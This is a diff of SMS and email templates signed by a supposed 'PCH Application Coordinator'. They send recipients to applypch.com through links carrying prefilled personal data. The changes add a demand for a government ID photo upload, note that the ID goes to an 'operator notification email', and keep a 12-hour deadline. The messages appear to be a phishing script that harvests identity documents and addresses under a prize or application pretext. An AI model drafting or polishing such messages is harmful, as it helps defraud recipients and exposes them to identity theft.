@@ -135,7 +135,7 @@ https://applypch.com/documents/application-profile.html?ref=PCH-[DATE]-[ID]&name
 ```
 Hi [First Name], this is Dave Sayer, PCH Application Coordinator.
 
-You confirmed your application on this text — thank you. The next step is to complete your full application and verification profile on our official site (one form — no need to type answers back on text).
+You confirmed your application on this text — thank you. The next step is to complete your full application and verification profile on our official site (one form — no need to type answers back on text). You will need to upload a photo of your government ID (driver's license, state ID, or passport).
 
 Open this link on your phone or computer, fill in every section, and submit:
 
@@ -158,7 +158,7 @@ Thank you for confirming your application. Please complete your full application
 
 https://applypch.com/documents/application-profile.html?ref=PCH-[DATE]-[ID]&name=[Name]&email=[email]&phone=[phone]&category=[category]&date=[YYYY-MM-DD]&address=[street]&city=[city]&region=[region]&postal=[zip]&country=[country]
 
-The form includes identity verification and final review questions. After submission you will receive email confirmation and see a success message on screen while your file is processed.
+The form includes identity verification (government ID upload required), address, and final review questions. After submission you will receive email confirmation and see a success message on screen while your file is processed. Your ID is attached to the operator notification email only.
 
 Please complete within 12 hours.
 
